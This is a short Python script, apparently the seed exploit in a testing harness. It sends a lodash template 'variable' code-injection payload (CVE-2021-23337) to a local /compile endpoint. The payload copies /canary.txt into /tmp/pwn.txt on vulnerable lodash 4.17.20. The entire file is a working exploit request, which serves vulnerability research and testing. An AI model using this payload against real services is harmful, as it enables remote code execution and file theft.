#!/usr/bin/env python3
"""[GIVEN] CVE-2021-23337 seed exploit for lodash-cve-2026-4800.

options.variable value flows into the compiled function parameter list. A
default-parameter payload `x=<expr>` executes at call time (compiled() called
with no args). Payload writes the /canary.txt content to /tmp/pwn.txt.

Reaches the flag on v0 (4.17.20); BLOCKED on v1 (4.17.21, variable validated).
"""
from urllib.request import urlopen, Request
import json


def candidate(*, base="http://127.0.0.1:55111"):
    payload = {
        "source": "X",
        "variable": 'x=process.getBuiltinModule("fs").writeFileSync("/tmp/pwn.txt", process.getBuiltinModule("fs").readFileSync("/canary.txt"))'
    }
    req = Request(base + "/compile", data=json.dumps(payload).encode(),
                  headers={"Content-Type": "application/json"}, method="POST")
    try:
        with urlopen(req, timeout=10) as r:
            return {"status": r.status, "body": r.read().decode("utf-8", "replace")}
    except Exception as e:
        return {"status": getattr(e, "code", None), "body": ""}


if __name__ == "__main__":
    print(json.dumps(candidate(), indent=2))
